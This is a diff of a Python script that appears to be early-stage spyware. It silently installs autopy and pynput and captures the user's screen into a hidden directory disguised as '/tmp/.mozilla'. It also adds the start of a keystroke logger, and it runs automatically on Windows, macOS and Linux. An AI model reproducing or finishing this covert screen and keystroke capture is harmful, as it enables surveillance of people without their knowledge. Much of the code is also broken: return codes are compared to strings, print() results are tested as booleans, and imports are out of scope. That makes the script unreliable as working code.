@@ -1,57 +1,70 @@
 #!/usr/bin/python3
 
-#notes: make it where it can tell what OS it is using.
 #libraries
-import os,platform, subprocess, sys 
+import os,platform, subprocess, sys, time
 
-# install autpy and libraries
-def installAutopy():
+# install packages
+def installSoft():
     if platform.system() == "win32": 
-        if os.system('pip3 show autpy') == "autopy":
+        if os.system('pip3 show autpy') == "autopy" and os.system('pip3 show pynput') == "pynput":
             pass
         else:
-            os.system('pip3 -q install autopy --user; ')
+            os.system('pip3 -q install autopy pynput --user; ')
     elif platform.system() == "darwin":
-        if os.system('pip3 -q list | grep autopy') == "autopy":
+        if os.system('pip3 -q list | grep autopy') == "autopy" and os.system('pip3 show pynput') == "pynput" :
             pass
         else:
-            os.system('pip3 -q install autopy --user; ')
+            os.system('pip3 -q install autopy pynput --user; ')
     elif platform.system() == "Linux":
-        if os.system('pip3 -q list | grep autopy') == "autopy":
+        if os.system('pip3 -q list | grep autopy') == "autopy" and os.system('pip3 -q list | grep pynput') == "pynput":
             pass
         else:
-            os.system('pip3 -q install autopy --user; ')
+            os.system('pip3 -q install autopy pynput --user; ')
     else:
         print("Not a valid OS")
-        quit()
-
-import autopy
+        quit() 
 #functions
 
 def screenshotsLinux():
-    os.mkdir('/tmp/.mozilla')
+    if print(os.path.isdir("/tmp/.mozilla")) == True:
+        pass
+    elif print(os.path.isdir("/tmp/.mozilla")) == False:
+        os.mkdir('/tmp/.mozilla')
+    else:
+        pass
     b = autopy.bitmap.capture_screen()
     b.save("/tmp/.mozilla/ss.png")
+    os.system('sleep 60')
+    os.remove('/tmp/.mozilla/ss.png')
 
 def screenshotsWin():
-    os.mkdir('/tmp/.mozilla')
+    os.mkdir(r'C:\tmp\mozilla')
     b = autopy.bitmap.capture_screen()
-    b.save("/tmp/.mozillass.png")
+    b.save(r"C:\tmp\mozilla\ss.png")
 
 def keystrokes():
-    print ('In the works')
+    from pynput.keyboard import Key, Listener
+    import logging
 
 
 #checks what OS it is
-if platform.system() == "win32":
-    installAutopy() 
-    screenshotsWin()
-elif platform.system() == "darwin":
-    installAutopy()
-    screenshotsLinux() 
-elif platform.system() == "Linux":
-    installAutopy()
-    screenshotsLinux()
-else:
-    print("Not a valid OS")
-    quit()
+def OScheck():
+    if platform.system() == "win32":
+        installSoft()
+        import autopy, pynput 
+        screenshotsWin()
+        keystrokes()
+    elif platform.system() == "darwin":
+        installSoft()
+        import autopy, pynput 
+        screenshotsLinux()
+        keystrokes() 
+    elif platform.system() == "Linux":
+        installSoft()
+        import autopy, pynput 
+        screenshotsLinux()
+        keystrokes()
+    else:
+        print("Not a valid OS")
+        quit()
+OScheck()
